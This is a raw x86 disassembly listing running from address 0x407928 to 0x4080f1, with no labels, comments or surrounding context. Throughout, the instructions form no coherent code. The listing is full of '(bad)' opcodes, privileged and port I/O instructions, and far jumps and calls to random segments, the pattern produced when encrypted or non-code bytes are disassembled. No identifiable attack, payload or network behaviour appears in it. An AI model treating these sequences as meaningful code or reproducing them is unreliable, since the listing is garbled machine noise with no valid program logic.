  407928:	xchg   edx,eax
  407929:	addr16 loop 0x407910
  40792c:	cld    
  40792d:	hlt    
  40792e:	out    0xc4,al
  407930:	or     DWORD PTR [esi+0x4e],0xaf31f873
  407937:	sbb    ch,ah
  407939:	xchg   eax,edi
  40793b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40793d:	add    ebp,edi
  40793f:	sbb    BYTE PTR [esi+0x26],al
  407942:	sbb    eax,0xbb8e9d78
  407947:	mov    cl,BYTE PTR [ebx-0x37ea93e3]
  40794d:	mov    eax,ds:0xbd2e0b29
  407952:	dec    eax
  407953:	adc    DWORD PTR [edi],ebx
  407955:	xchg   edx,eax
  407956:	push   esp
  407957:	outs   dx,DWORD PTR ds:[esi]
  407958:	dec    ecx
  407959:	aaa    
  40795a:	jb     0x407942
  40795c:	cmp    bl,BYTE PTR [edi]
  40795e:	sahf   
  40795f:	btc    DWORD PTR [esp+ecx*2],esi
  407963:	xlat   BYTE PTR ds:[ebx]
  407964:	xor    eax,0xaa3e65af
  407969:	inc    edi
  40796a:	add    BYTE PTR [edi],ah
  40796c:	dec    ebp
  40796d:	mov    BYTE PTR [ebx+0x43a0e67e],ch
  407973:	call   0xeef867fe
  407978:	jmp    0x3469:0x71eee125
  40797f:	mov    DWORD PTR [eax+eax*8-0x18],ebp
  407983:	xor    eax,0x25be3d8e
  407988:	lods   al,BYTE PTR ds:[esi]
  407989:	jmp    0x4079ed
  40798b:	cld    
  40798c:	push   esp
  40798d:	mov    WORD PTR [ebp+0x6aa68ffd],ss
  407993:	and    al,0x2c
  407995:	(bad)  
  407997:	loopne 0x407956
  407999:	lea    edx,[esi-0x455fd694]
  40799f:	jle    0x407979
  4079a1:	aaa    
  4079a2:	clc    
  4079a3:	xchg   edi,eax
  4079a4:	mov    ah,0xd6
  4079a6:	mov    edx,0x99cd1a1b
  4079ab:	push   es
  4079ac:	aam    0xb2
  4079ae:	imul   DWORD PTR [ebp-0x3c5a7bf4]
  4079b4:	fidivr DWORD PTR [ebx+0x7]
  4079b7:	xor    eax,0xd5480c70
  4079bc:	loope  0x4079ae
  4079be:	hlt    
  4079bf:	ins    DWORD PTR es:[edi],dx
  4079c0:	jo     0x4079b5
  4079c2:	data16 jnp 0x4079dc
  4079c5:	mov    esp,0xc369274d
  4079ca:	dec    ecx
  4079cb:	pop    ecx
  4079cc:	cdq    
  4079cd:	test   al,al
  4079cf:	test   BYTE PTR [ecx],al
  4079d1:	ins    BYTE PTR es:[edi],dx
  4079d2:	outs   dx,DWORD PTR ds:[esi]
  4079d3:	in     eax,dx
  4079d4:	shl    DWORD PTR [edx],0xa6
  4079d7:	xor    BYTE PTR [ebp+0xff0285],dl
  4079dd:	test   BYTE PTR [eax+eiz*4-0x2c],dh
  4079e1:	call   0x65a0:0x320c35c0
  4079e8:	mov    DWORD PTR [ebx+0x471df23],eax
  4079ee:	cld    
  4079ef:	fild   QWORD PTR [ebx-0x77]
  4079f2:	lds    esi,FWORD PTR [ecx+0x42d5914f]
  4079f8:	and    ebp,DWORD PTR [ebp-0x1]
  4079fb:	cmp    esi,DWORD PTR [esi+0x7fcba915]
  407a01:	std    
  407a02:	stc    
  407a03:	neg    eax
  407a05:	lods   al,BYTE PTR ds:[esi]
  407a06:	add    al,0x5
  407a08:	adc    ch,BYTE PTR [ebx]
  407a0a:	ins    DWORD PTR es:[edi],dx
  407a0b:	loopne 0x4079ec
  407a0d:	xchg   DWORD PTR [ecx+0x485a9c56],eax
  407a13:	ret    0x39de
  407a16:	(bad)  
  407a17:	cmp    esi,DWORD PTR [edx-0x35]
  407a1a:	xchg   esp,eax
  407a1b:	add    DWORD PTR [ebp-0x774f99c6],0xbeddf3e9
  407a25:	inc    esi
  407a26:	jo     0x407a21
  407a28:	rcl    BYTE PTR [edi+edx*1-0x27803913],1
  407a2f:	aaa    
  407a30:	ret    
  407a31:	sub    BYTE PTR [ebx+esi*8-0x33],al
  407a35:	pop    ecx
  407a36:	add    eax,0xd59d4a5f
  407a3b:	or     ebx,DWORD PTR [ebx+0x25]
  407a3e:	or     eax,0x7f35d02b
  407a43:	sbb    bl,dl
  407a45:	or     DWORD PTR [edx+0x9a0599f],ecx
  407a4b:	or     DWORD PTR [edi+0x5a],ebp
  407a4e:	sub    esp,DWORD PTR [ecx+0x2353677e]
  407a54:	and    ch,dl
  407a56:	aas    
  407a57:	jl     0x407aa3
  407a59:	mov    cl,0xf0
  407a5b:	hlt    
  407a5c:	aad    0x10
  407a5e:	or     eax,0xbec4cf9c
  407a63:	daa    
  407a64:	cmp    al,0xfe
  407a66:	imul   edx,DWORD PTR [edx-0x7c550330],0xd9f69e40
  407a70:	repz clc 
  407a72:	mov    al,ds:0x181a1ea6
  407a77:	push   edi
  407a78:	adc    al,0x90
  407a7a:	ja     0x407a0b
  407a7c:	inc    eax
  407a7d:	adc    ebp,ecx
  407a7f:	push   ebp
  407a80:	cmp    al,0x49
  407a82:	rcr    BYTE PTR ds:0xaf30d4cb,cl
  407a88:	dec    esi
  407a89:	stc    
  407a8a:	push   eax
  407a8b:	cld    
  407a8c:	cmp    al,0x20
  407a8e:	rol    DWORD PTR [esi],1
  407a90:	cli    
  407a91:	enter  0xc555,0x62
  407a95:	pop    ebx
  407a96:	push   ebp
  407a97:	fiadd  WORD PTR [ecx]
  407a99:	jne    0x407a6b
  407a9b:	into   
  407a9c:	xor    al,0x3d
  407a9e:	les    ecx,FWORD PTR [ecx]
  407aa0:	iret   
  407aa1:	xor    ebp,ecx
  407aa3:	cs test eax,0xbcd531e
  407aa9:	cwde   
  407aaa:	mov    esp,0x32591f12
  407aaf:	pop    ecx
  407ab0:	and    ch,bl
  407ab2:	scas   eax,DWORD PTR es:[edi]
  407ab3:	and    ecx,0xfffffff5
  407ab6:	aad    0xbf
  407ab8:	ror    dh,0xcd
  407abb:	ror    DWORD PTR ds:0x756b4865,cl
  407ac1:	jmp    0x5a9a:0x6b140cb4
  407ac8:	mov    ds:0x60ff29d,al
  407acd:	jno    0x407b3f
  407acf:	mov    dh,0x82
  407ad1:	add    DWORD PTR ds:0x15cd0d23,edx
  407ad7:	push   edi
  407ad8:	mov    esi,0x65dc2d19
  407add:	sub    eax,0xdef7378a
  407ae2:	mov    ebx,0x76e8491e
  407ae7:	or     eax,0x35b929a3
  407aec:	mov    ch,0xa1
  407aee:	sbb    ecx,ebx
  407af0:	jae    0x407ae2
  407af2:	mov    cl,0x1
  407af4:	push   ss
  407af5:	ds call 0x2f96:0xce053a9a
  407afd:	mov    ds:0x34e73c9e,al
  407b02:	push   cs
  407b03:	rcr    eax,1
  407b05:	adc    eax,0xd8b4df5c
  407b0a:	xor    eax,0x3230185c
  407b0f:	dec    ebp
  407b10:	mov    ebp,0x913dfdac
  407b15:	(bad)
  407b18:	adc    BYTE PTR [esi],bl
  407b1a:	push   edx
  407b1b:	out    0xf,eax
  407b1d:	mov    esi,0x6ac20088
  407b22:	(bad)  [edi+eax*2+0x396538a5]
  407b29:	mov    dh,0x24
  407b2b:	cwde   
  407b2c:	cmp    esp,DWORD PTR [ebp-0x17]
  407b2f:	xor    BYTE PTR [esi],cl
  407b31:	outs   dx,DWORD PTR ds:[esi]
  407b32:	fsub   DWORD PTR [ebx-0x691432e1]
  407b38:	mov    ebp,0x564f01a3
  407b3d:	add    eax,0xda8517a2
  407b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b43:	dec    edi
  407b44:	ret    
  407b45:	push   cs
  407b46:	leave  
  407b47:	adc    eax,0x428413e6
  407b4c:	adc    cl,BYTE PTR [edi]
  407b4e:	xlat   BYTE PTR ds:[ebx]
  407b4f:	pop    esp
  407b50:	in     eax,0xf6
  407b52:	add    DWORD PTR [esi-0x2],esp
  407b55:	mov    cl,0xd3
  407b57:	dec    esp
  407b58:	loop   0x407b75
  407b5a:	jmp    0x6c572ee6
  407b5f:	or     al,0x69
  407b61:	je     0x407bbc
  407b63:	lahf   
  407b64:	sub    DWORD PTR [ebp+0x2a],0xe762b9ab
  407b6b:	mov    eax,ds:0x1dcc6c62
  407b70:	call   0x1a9e4ae9
  407b75:	jnp    0x407bb5
  407b77:	rol    bh,1
  407b79:	dec    eax
  407b7a:	and    eax,0x584eb8e5
  407b7f:	sbb    dl,BYTE PTR [ebx+ecx*4]
  407b82:	mov    BYTE PTR [eax],bh
  407b84:	inc    ebx
  407b85:	jno    0x407b32
  407b87:	int    0xd5
  407b89:	data16 and al,0x32
  407b8c:	mov    ds:0x5a43b9a3,al
  407b91:	add    BYTE PTR [edx+0x26],bh
  407b94:	enter  0x2df5,0x89
  407b98:	jl     0x407ba0
  407b9a:	icebp  
  407b9b:	aam    0xb5
  407b9d:	mov    ch,0x25
  407b9f:	(bad)  
  407ba0:	into   
  407ba1:	xor    al,0x87
  407ba3:	das    
  407ba4:	push   0xffffff81
  407ba6:	mov    esp,?
  407ba8:	adc    esp,DWORD PTR [ecx+0x16]
  407bab:	rol    ebx,cl
  407bad:	xlat   BYTE PTR ds:[ebx]
  407bae:	inc    edx
  407baf:	bound  ebx,QWORD PTR [ecx]
  407bb1:	imul   edi,DWORD PTR ds:0x684ada54,0x8
  407bb8:	loope  0x407c30
  407bba:	xor    al,0x57
  407bbc:	mov    BYTE PTR [edx],dh
  407bbe:	(bad)  
  407bbf:	mov    ds:0xca58489,eax
  407bc4:	aad    0x1b
  407bc6:	cdq    
  407bc7:	dec    esi
  407bc8:	push   0xb
  407bca:	(bad)  
  407bcb:	push   esp
  407bcc:	enter  0xd014,0xe6
  407bd0:	xchg   esp,eax
  407bd1:	add    al,0xc5
  407bd3:	xchg   edx,eax
  407bd4:	inc    ecx
  407bd5:	nop
  407bd6:	fs js  0x407b9c
  407bd9:	shl    BYTE PTR [ecx],1
  407bdb:	(bad)  
  407bdc:	in     eax,dx
  407bdd:	jle    0x407c2d
  407bdf:	cmp    eax,DWORD PTR [ebp+edx*2+0x39]
  407be3:	inc    edi
  407be4:	mov    dh,0xef
  407be6:	ret    
  407be7:	xor    eax,0x4546d81c
  407bec:	neg    ecx
  407bee:	pop    ebx
  407bef:	(bad)  
  407bf0:	iret   
  407bf1:	in     al,0xb4
  407bf3:	add    al,0x13
  407bf5:	bswap  eax
  407bf7:	jbe    0x407c51
  407bf9:	or     BYTE PTR [edi+0x49b5ebc8],cl
  407bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c00:	push   edi
  407c01:	pop    esi
  407c02:	and    al,0x82
  407c04:	mov    ch,0x87
  407c06:	shl    BYTE PTR [esi],1
  407c08:	mov    bl,0xce
  407c0a:	mov    bh,0x67
  407c0c:	adc    al,0xb3
  407c0e:	push   esi
  407c0f:	adc    esi,eax
  407c11:	add    BYTE PTR [ebp-0x5d],bl
  407c14:	cmp    al,0x40
  407c16:	push   es
  407c17:	xchg   ecx,eax
  407c18:	repnz data16 sar BYTE PTR [esi+eiz*8-0x146d30f2],cl
  407c21:	popa   
  407c22:	or     eax,0x8292d8ae
  407c27:	dec    edi
  407c28:	daa    
  407c29:	gs cdq 
  407c2b:	dec    edi
  407c2c:	aas    
  407c2d:	ror    BYTE PTR [ecx+0x46],1
  407c30:	push   ecx
  407c31:	adc    BYTE PTR [ebp-0x58],ah
  407c34:	or     eax,DWORD PTR [ebx]
  407c36:	cmp    al,0x17
  407c38:	or     eax,0x140906e0
  407c3d:	xor    BYTE PTR [esi-0x69],0x44
  407c41:	test   BYTE PTR [ebp-0x5],ah
  407c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c45:	cmp    DWORD PTR [esi-0x4c0f1e5a],ecx
  407c4b:	sub    al,0xe8
  407c4d:	mov    ah,0x84
  407c4f:	call   0x80db:0xa60d5f92
  407c56:	pop    edx
  407c57:	jbe    0x407c3f
  407c59:	idiv   DWORD PTR [ecx+0x7c]
  407c5c:	mov    esp,0xb3273ad4
  407c61:	arpl   sp,sp
  407c63:	mov    ah,0x13
  407c65:	push   0x325b86c0
  407c6a:	push   0x16
  407c6c:	(bad)  
  407c6d:	pop    ecx
  407c6e:	mov    al,ds:0x747e8849
  407c73:	cmp    esp,DWORD PTR [esp+eax*1-0x280d0226]
  407c7a:	push   ebx
  407c7b:	(bad)  
  407c7d:	mov    eax,0x601f1ec5
  407c82:	(bad)  
  407c83:	jge    0x407c96
  407c85:	out    0xe5,al
  407c87:	jle    0x407cc9
  407c89:	in     al,0xa8
  407c8b:	icebp  
  407c8c:	or     DWORD PTR [edi+0x55],0x9c4eb80d
  407c93:	cmp    dl,BYTE PTR [edi-0x66]
  407c96:	sub    ebx,ecx
  407c98:	jbe    0x407d02
  407c9a:	mov    edx,ebp
  407c9c:	iret   
  407c9d:	scas   al,BYTE PTR es:[edi]
  407c9e:	in     al,0xe0
  407ca0:	xor    edi,DWORD PTR [ebp+0x74b3d60a]
  407ca6:	fcomp  DWORD PTR [ebx]
  407ca8:	push   0x59
  407caa:	dec    esp
  407cab:	push   eax
  407cac:	jmp    0xba25b5fb
  407cb1:	in     al,0x48
  407cb3:	xchg   DWORD PTR [ebp-0x6a],eax
  407cb6:	addr16 sub eax,0x165cec69
  407cbc:	lock imul eax,DWORD PTR [ebp+0x15],0x35
  407cc1:	(bad)  
  407cc2:	push   ds
  407cc3:	pop    ecx
  407cc4:	push   0xffffffde
  407cc6:	dec    eax
  407cc7:	das    
  407cc8:	cdq    
  407cc9:	nop
  407cca:	jmp    0x407cdf
  407ccc:	sub    ebx,eax
  407cce:	jp     0x407d1a
  407cd0:	mov    esp,0x593a0f75
  407cd5:	xchg   edx,eax
  407cd6:	cmc    
  407cd7:	mov    cl,0x10
  407cd9:	daa    
  407cda:	push   ds
  407cdb:	lds    esi,FWORD PTR [ebp-0x690fcd3b]
  407ce1:	inc    edx
  407ce2:	(bad)  
  407ce3:	lods   al,BYTE PTR ds:[esi]
  407ce4:	test   al,0x24
  407ce6:	pop    eax
  407ce7:	and    BYTE PTR [eax+0x36],bh
  407cea:	jg     0x407ce6
  407cec:	inc    ebx
  407ced:	cdq    
  407cee:	push   ebp
  407cef:	or     eax,0xec9d186a
  407cf4:	out    0x47,eax
  407cf6:	pop    es
  407cf7:	aad    0x4c
  407cf9:	xor    DWORD PTR gs:[eax],0xcad86754
  407d00:	and    BYTE PTR [ecx],ch
  407d02:	sbb    DWORD PTR [edi],ecx
  407d04:	and    ah,BYTE PTR [esi+0x88603ba]
  407d0a:	bsf    eax,DWORD PTR [ebx+0x41]
  407d0e:	daa    
  407d0f:	cli    
  407d10:	scas   eax,DWORD PTR es:[edi]
  407d11:	aas    
  407d12:	sti    
  407d13:	sub    DWORD PTR [edx-0x18412cc8],ecx
  407d19:	cmp    edx,DWORD PTR [ecx+0x72]
  407d1c:	push   ecx
  407d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d1e:	mov    eax,ds:0xbaa2e9fa
  407d23:	fs cs mov dh,0xcc
  407d27:	pop    ds
  407d28:	das    
  407d29:	add    bh,BYTE PTR [ebp+0x0]
  407d2c:	mov    esi,0xd7cdbbba
  407d31:	mov    bl,0x25
  407d33:	mov    ds:0xc0025c01,eax
  407d38:	jmp    0xfe72c7e6
  407d3d:	mov    edi,0xfe93e895
  407d42:	jns    0x407d42
  407d44:	stc    
  407d45:	lahf   
  407d46:	mov    ebx,0x875942e2
  407d4b:	mov    edi,0xbce73faf
  407d50:	int3   
  407d51:	pop    edx
  407d52:	icebp  
  407d53:	(bad)  
  407d54:	mov    BYTE PTR [eax],0xc
  407d57:	outs   dx,DWORD PTR ds:[esi]
  407d58:	jne    0x407d9b
  407d5a:	test   al,0x1f
  407d5c:	cdq    
  407d5d:	stos   DWORD PTR es:[edi],eax
  407d5e:	mov    dl,0xdc
  407d60:	mov    dh,0x6c
  407d62:	pop    ebx
  407d63:	pop    edx
  407d64:	(bad)  
  407d65:	repnz out 0xb4,al
  407d68:	aad    0x81
  407d6a:	sub    eax,0x454d3e0
  407d6f:	or     DWORD PTR ds:0x4a1e0027,0x463fe559
  407d79:	push   ebp
  407d7a:	(bad)  
  407d7b:	xchg   DWORD PTR [esi-0x4b],ecx
  407d7e:	inc    esi
  407d7f:	xor    DWORD PTR [ebp-0x1c068392],edi
  407d85:	(bad)  
  407d86:	cdq    
  407d87:	mov    eax,ds:0xabab2815
  407d8c:	dec    edi
  407d8d:	push   edx
  407d8e:	js     0x407d23
  407d90:	(bad)  
  407d91:	mov    ds:0xdacf39bd,al
  407d96:	push   ds
  407d97:	jb     0x407d64
  407d99:	ins    DWORD PTR es:[edi],dx
  407d9a:	int3   
  407d9b:	jbe    0x407d3d
  407d9d:	js     0x407d9b
  407d9f:	inc    ebp
  407da0:	xchg   edi,eax
  407da1:	dec    edi
  407da2:	sar    DWORD PTR [edx-0x3fa6f1bd],0x48
  407da9:	adc    al,0x7
  407dab:	lea    eax,[edx]
  407dad:	mov    al,ds:0x4d098f66
  407db2:	pop    esi
  407db3:	lods   al,BYTE PTR ds:[esi]
  407db4:	cmp    dh,BYTE PTR [esi+0x24f3def2]
  407dba:	push   ds
  407dbb:	out    0xc7,eax
  407dbd:	jle    0x407dd1
  407dbf:	sbb    edi,DWORD PTR [edx]
  407dc1:	jb     0x407dec
  407dc3:	xor    al,0x49
  407dc5:	outs   dx,DWORD PTR ds:[esi]
  407dc6:	dec    eax
  407dc7:	stc    
  407dc8:	mov    ebp,0x98f885d1
  407dcd:	js     0x407dc5
  407dcf:	and    bh,BYTE PTR [ecx]
  407dd1:	daa    
  407dd2:	cmp    BYTE PTR ss:[ebx],ah
  407dd5:	cld    
  407dd6:	aaa    
  407dd7:	out    dx,al
  407dd8:	adc    eax,DWORD PTR [ebx]
  407dda:	mov    al,0x50
  407ddc:	mov    ch,dl
  407dde:	bound  eax,QWORD PTR [edx+0xf17f788]
  407de4:	mov    cl,0x7d
  407de6:	jo     0x407e59
  407de8:	popa   
  407de9:	xchg   ebp,eax
  407dea:	jmp    0xd802:0x2214945d
  407df1:	sub    al,0x49
  407df3:	add    BYTE PTR [edx+0x625144f1],ch
  407df9:	xchg   esp,eax
  407dfa:	inc    ecx
  407dfb:	out    dx,eax
  407dfc:	fstp   TBYTE PTR [ebx]
  407dfe:	or     eax,0xe5bf875
  407e03:	in     eax,dx
  407e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e05:	pushf  
  407e06:	jle    0x407df8
  407e08:	hlt    
  407e09:	mov    dh,0xdc
  407e0b:	push   0x22
  407e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e0e:	mov    ch,BYTE PTR [ebp-0x54]
  407e11:	es or  cl,bh
  407e14:	retf   0xd686
  407e17:	and    edi,DWORD PTR [edi]
  407e19:	and    BYTE PTR [esi-0x7e2811d2],dh
  407e1f:	int    0x9
  407e21:	xchg   DWORD PTR [edx],eax
  407e23:	lods   eax,DWORD PTR ds:[esi]
  407e24:	mov    ds:0xda1820ab,al
  407e29:	sub    cl,cl
  407e2b:	out    0x69,eax
  407e2d:	or     eax,0x7cb74fa2
  407e32:	push   0xc
  407e34:	call   0xf4d8:0x882a4c5f
  407e3b:	jne    0x407e97
  407e3d:	adc    al,0xf0
  407e3f:	push   ecx
  407e40:	sbb    bl,BYTE PTR [eax-0x34]
  407e43:	in     eax,0xa9
  407e45:	test   DWORD PTR [ecx],eax
  407e47:	inc    esi
  407e48:	mov    esi,0xc787b37d
  407e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e4e:	shl    BYTE PTR [edi-0x3f],0x15
  407e52:	sub    dh,ah
  407e54:	hlt    
  407e55:	mov    DWORD PTR gs:[esi-0x4cceb2a1],esp
  407e5c:	lock xchg esi,eax
  407e5e:	mov    al,0xe3
  407e60:	push   es
  407e61:	push   esp
  407e62:	adc    al,BYTE PTR [ebp-0x2e]
  407e65:	jns    0x407e84
  407e67:	sbb    ebp,DWORD PTR [edx+edi*4]
  407e6a:	ror    BYTE PTR [ecx-0x3e968be0],1
  407e70:	mov    eax,0x215d5dac
  407e75:	test   DWORD PTR [ebx-0x10],ebp
  407e78:	addr16 jl 0x407e9b
  407e7b:	out    dx,eax
  407e7c:	test   BYTE PTR [esi],dh
  407e7e:	pop    ecx
  407e7f:	push   ebp
  407e80:	or     ch,BYTE PTR [edx-0x76dd6e3a]
  407e86:	xchg   eax,ebp
  407e88:	mov    ebx,0x92f28017
  407e8d:	nop
  407e8e:	pop    es
  407e8f:	adc    ch,BYTE PTR [eax]
  407e91:	add    DWORD PTR [edx],ebx
  407e93:	mov    dh,0xc
  407e95:	jbe    0x407e28
  407e97:	loope  0x407ef5
  407e99:	iret   
  407e9a:	lods   al,BYTE PTR ds:[esi]
  407e9b:	sub    ecx,DWORD PTR [ebp-0x25]
  407e9e:	mov    BYTE PTR [edx+0x565aee0b],dh
  407ea4:	outs   dx,BYTE PTR ds:[esi]
  407ea5:	xor    eax,0x2903d855
  407eaa:	aam    0x4
  407eac:	or     dh,BYTE PTR [esp+0x17a86077]
  407eb3:	jg     0x407f28
  407eb5:	xor    DWORD PTR [esi],0xc541e763
  407ebb:	loop   0x407edb
  407ebd:	push   0x98e9e922
  407ec2:	mov    ah,0x54
  407ec4:	mov    dl,0xae
  407ec6:	ror    BYTE PTR [ecx],cl
  407ec8:	dec    edx
  407ec9:	mov    al,0xf6
  407ecb:	jl     0x407e9e
  407ecd:	(bad)  [edx+eax*1]
  407ed0:	in     eax,0x25
  407ed2:	cdq    
  407ed3:	enter  0xef18,0x59
  407ed7:	cmp    eax,0xed178ebf
  407edc:	jp     0x407e94
  407ede:	stos   DWORD PTR es:[edi],eax
  407edf:	xchg   DWORD PTR [edi+0x612cc1ab],esp
  407ee5:	jmp    0x407f4c
  407ee7:	sbb    edx,esi
  407ee9:	jno    0x407e7d
  407eeb:	xor    al,0x2f
  407eed:	leave  
  407eee:	xor    esp,DWORD PTR [ebx-0x66]
  407ef1:	int    0x52
  407ef3:	iret   
  407ef4:	jae    0x407ebb
  407ef6:	adc    al,0x36
  407ef8:	inc    edx
  407ef9:	sbb    bl,BYTE PTR [ebx+0x23]
  407efc:	(bad)  
  407efd:	pop    ebp
  407efe:	jnp    0x407f20
  407f00:	xor    DWORD PTR [ebp+0x60],0xf8571f41
  407f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f08:	jg     0x407f76
  407f0a:	out    dx,al
  407f0b:	mov    bl,0x6b
  407f0d:	pop    esi
  407f0e:	jne    0x407f75
  407f10:	sub    eax,0x38f0d4eb
  407f15:	in     al,0xd2
  407f17:	push   eax
  407f18:	pop    esi
  407f19:	das    
  407f1a:	adc    ch,bl
  407f1c:	out    dx,eax
  407f1d:	xchg   edi,eax
  407f1e:	adc    BYTE PTR [edx+0x280e59ee],ah
  407f24:	mov    edi,0x418fe66f
  407f29:	out    0xe2,eax
  407f2b:	out    dx,eax
  407f2c:	popa   
  407f2d:	mov    edi,DWORD PTR [ebx]
  407f2f:	shl    BYTE PTR [esi-0x4b20496b],1
  407f35:	jno    0x407f6f
  407f37:	test   cl,bl
  407f39:	xchg   ebx,eax
  407f3a:	or     esi,DWORD PTR [edi]
  407f3c:	test   eax,0xc259b1dd
  407f41:	nop
  407f42:	add    ebp,DWORD PTR [ebp+0x79]
  407f45:	mov    bh,0x3
  407f47:	mov    dl,0xbd
  407f49:	(bad)  
  407f4a:	aad    0x66
  407f4c:	sub    bl,ah
  407f4e:	fld    TBYTE PTR [edx]
  407f50:	les    eax,FWORD PTR [ebx]
  407f52:	jno    0x407f3d
  407f54:	(bad)  
  407f56:	imul   esp,DWORD PTR [edi],0x55
  407f59:	add    BYTE PTR [esi+0x7f],dh
  407f5c:	jp     0x407fda
  407f5e:	aam    0xaa
  407f60:	ret    0x627d
  407f63:	leave  
  407f64:	dec    eax
  407f65:	es enter 0x1e5f,0x7b
  407f6a:	jmp    0x407f00
  407f6c:	fdiv   QWORD PTR [ebx]
  407f6e:	popa   
  407f6f:	or     ah,BYTE PTR [ebx+0x54]
  407f72:	xor    eax,0xddf82ac3
  407f77:	in     eax,0xf4
  407f79:	pop    eax
  407f7a:	sub    BYTE PTR [eax],al
  407f7c:	mov    ecx,0x1b30f7e5
  407f81:	jns    0x407f5e
  407f83:	dec    ebx
  407f84:	mov    bh,BYTE PTR [ebx-0x75]
  407f87:	xor    dh,BYTE PTR [edx]
  407f89:	jno    0x407f3d
  407f8b:	fcom   QWORD PTR [esi]
  407f8d:	add    bl,BYTE PTR [edx-0x25]
  407f90:	jp     0x407f33
  407f92:	icebp  
  407f93:	es push edx
  407f95:	std    
  407f96:	in     al,dx
  407f97:	jns    0x40800d
  407f99:	xchg   ecx,eax
  407f9a:	imul   ebp,DWORD PTR [ebp+0x61],0xbc5a149e
  407fa1:	xchg   ebp,eax
  407fa2:	js     0x407fb1
  407fa4:	lahf   
  407fa5:	adc    BYTE PTR [esi],bh
  407fa7:	ja     0x407fb6
  407fa9:	sahf   
  407faa:	pop    esp
  407fab:	pushf  
  407fac:	xor    al,0xc2
  407fae:	dec    ecx
  407faf:	aas    
  407fb0:	imul   ecx,edi,0x81910ef1
  407fb6:	xchg   ebx,eax
  407fb7:	and    DWORD PTR [eax+0x7b54df56],0xfffffffc
  407fbe:	inc    edx
  407fbf:	retf   0x76d8
  407fc2:	enter  0x836b,0x1f
  407fc6:	nop
  407fc7:	sbb    BYTE PTR [edi+ecx*2+0x6be22734],dl
  407fce:	inc    esi
  407fcf:	sub    al,0x41
  407fd1:	add    BYTE PTR [esi-0x390ba71f],0xf7
  407fd8:	in     al,0xb7
  407fda:	rcr    DWORD PTR [ebx],cl
  407fdc:	popa   
  407fdd:	xchg   edi,eax
  407fde:	arpl   WORD PTR [eax+eax*4+0x6df646d3],sp
  407fe5:	and    eax,ecx
  407fe7:	pop    esp
  407fe8:	xchg   ebx,eax
  407fe9:	sbb    BYTE PTR [edi-0x15],0x3e
  407fed:	mov    edi,cs
  407fef:	jne    0x40803b
  407ff1:	idiv   DWORD PTR [ecx+ebx*1]
  407ff4:	cs dec edx
  407ff6:	ror    BYTE PTR [ebx+0x2aba2885],cl
  407ffc:	leave  
  407ffd:	adc    al,0x1a
  407fff:	mov    cl,0xcf
  408001:	adc    bh,al
  408003:	enter  0xe2cd,0xb7
  408007:	out    dx,eax
  408008:	mov    ds:0xf8c3782e,al
  40800d:	fisttp QWORD PTR [esi+0x6cf0fc4a]
  408013:	xor    al,0xd7
  408015:	popf   
  408016:	std    
  408017:	in     al,0xe8
  408019:	inc    esi
  40801a:	pop    esi
  40801b:	xor    edi,DWORD PTR [esi]
  40801d:	push   ecx
  40801e:	ret    0xcb9c
  408021:	sbb    al,0x68
  408023:	mov    ch,0xbc
  408025:	adc    BYTE PTR [ecx+eax*2+0x3ca838a3],bl
  40802c:	mov    esp,0xe9158150
  408031:	adc    esi,DWORD PTR [edx+eiz*4]
  408034:	lods   eax,DWORD PTR ds:[esi]
  408035:	div    BYTE PTR ds:0x3d2195b8
  40803b:	fistp  WORD PTR [edi+0x25]
  40803e:	jo     0x407fdf
  408040:	push   0x2213387b
  408045:	xchg   ecx,eax
  408046:	pop    ecx
  408047:	xlat   BYTE PTR ds:[ebx]
  408048:	xor    cl,BYTE PTR [esi+esi*2]
  40804b:	cmp    BYTE PTR [ebx],0x73
  40804e:	jb     0x4080ab
  408050:	xor    bl,dl
  408052:	sub    esi,ebp
  408054:	xchg   ebx,eax
  408055:	mov    esi,0xbc464623
  40805a:	jmp    0xe2230407
  40805f:	pusha  
  408060:	mov    cl,0x1c
  408062:	jle    0x408028
  408064:	jg     0x407ff3
  408066:	ja     0x4080df
  408068:	mov    eax,0x1f48c0f4
  40806d:	or     DWORD PTR [ebx+0x390f4c52],ebp
  408073:	ins    DWORD PTR es:[edi],dx
  408074:	mov    esp,0x72ea1e9b
  408079:	ds call 0xb685:0x410f4d1b
  408081:	and    DWORD PTR [edx],esi
  408083:	dec    ecx
  408084:	psrlw  mm1,mm2
  408087:	pushf  
  408088:	sahf   
  408089:	jns    0x4080ad
  40808b:	cmp    ah,BYTE PTR [ebx+0x11]
  40808e:	out    dx,al
  40808f:	cmc    
  408090:	xlat   BYTE PTR ds:[ebx]
  408091:	scas   al,BYTE PTR es:[edi]
  408092:	in     eax,0xed
  408094:	jo     0x40806b
  408096:	sbb    eax,0x4c95568e
  40809b:	fist   WORD PTR [esi]
  40809d:	push   edi
  40809e:	call   0xf856:0xe8f0da36
  4080a5:	jo     0x4080f4
  4080a7:	xor    esp,esp
  4080a9:	pusha  
  4080aa:	add    ebp,DWORD PTR [ebx-0x7e]
  4080ad:	mov    BYTE PTR [eax+0x7502e914],0xdb
  4080b4:	dec    edx
  4080b5:	push   es
  4080b6:	fnstenv [ebx]
  4080b8:	sub    DWORD PTR [eax],esi
  4080ba:	adc    esp,DWORD PTR [ebx+ecx*8-0x31]
  4080be:	shr    DWORD PTR [edi],cl
  4080c0:	inc    ecx
  4080c1:	jecxz  0x4080d2
  4080c3:	aaa    
  4080c4:	cmp    al,0x3a
  4080c6:	bound  esp,QWORD PTR [ecx]
  4080c8:	push   ebx
  4080c9:	mov    al,0x68
  4080cb:	pusha  
  4080cc:	sbb    al,0x8
  4080ce:	jl     0x4080b9
  4080d0:	cld    
  4080d1:	add    BYTE PTR [esi+0x12],dl
  4080d4:	sbb    eax,0xba426993
  4080d9:	push   ebx
  4080da:	jno    0x4080dd
  4080dc:	sub    al,0x57
  4080de:	call   0xa37f:0x8e326dcb
  4080e5:	cdq    
  4080e6:	or     al,0x32
  4080e8:	adc    dh,ah
  4080ea:	inc    edx
  4080eb:	add    DWORD PTR ds:0x9170a4d1,eax
  4080f1:	outs   dx,DWORD PTR ds:[esi]
